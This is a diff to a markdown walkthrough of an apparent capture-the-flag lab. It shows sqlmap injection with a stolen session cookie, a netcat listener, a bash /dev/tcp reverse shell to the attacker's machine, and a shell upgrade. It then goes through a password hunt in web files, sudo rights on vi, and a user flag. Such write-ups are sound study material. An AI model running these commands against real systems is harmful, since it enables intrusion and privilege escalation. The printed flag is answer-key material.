@@ -110,16 +110,47 @@ sqlmap -u "http://{target_ip}/dashboard.php?search=test" --cookie="PHPSESSID={co
 
 5. Let's go to our attack machine and create a netcat listner server
 
-   ```bash
-  nc -lvnp 5000 -e /bin/bash
-   ```
+```bash
+  nc -lvnp 5000
+```
 
 6. On our target machine running sqlmap os-shell let's connect to our server to spawn a reverse shell.
 
-   ```bash
+```bash
  bash -c  "bash -i >& /dev/tcp/{attack_machine_ip}/5000  0>&1"
-   ```
+
+```
 
 7. We have spawned a reverse shell however we do not have an interactive shell yet.
 ![Screenshot 2024-02-22 at 1 11 58 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/e4502837-7e73-4692-8d16-6c07b0d3aae5)
+
+8. Run the following to have an interactive shell. 
+```bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+stty raw -echo
+export TERM=xterm
+```
+
+9. We now have an interactive shell. Hovever we have to know the password of user `postgres` to run `sudo -l`
+    
+![Screenshot 2024-02-22 at 2 00 25 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/f39b4b0a-70c7-45ab-954f-325620f72896)
+
+10. We have to find the password in the system. And since this server running a website, one of the places we can look at is `/var/www/`
+![Screenshot 2024-02-22 at 2 26 14 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/60fdfdc5-b94d-487a-8b70-c05438972859)
+
+11. Let's explore each of the files in the `html` folder. Under the `dashboard.php` file we find. 
+
+![Screenshot 2024-02-22 at 2 32 15 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/2582d9ed-becf-4bd2-be03-eb392cde88b0)
+
+
+12. We test this password by using it for the password prompt for `sudo -l` Where we find that we have sudo rights for vi program.
+
+![Screenshot 2024-02-22 at 2 10 53 AM](https://github.com/niccololampa/cyber-security-notes/assets/37615906/752994b0-6b2d-4cf4-9aa4-9fa83b68a295)
+
+**Answer: vi ** 
+
+
+11. Run `cd ~/` to go to postgres user's folder. In here we will find user.txt
+    Flag `ec9b13ca4d6229cd5cc1e09980965bf7`
+
 
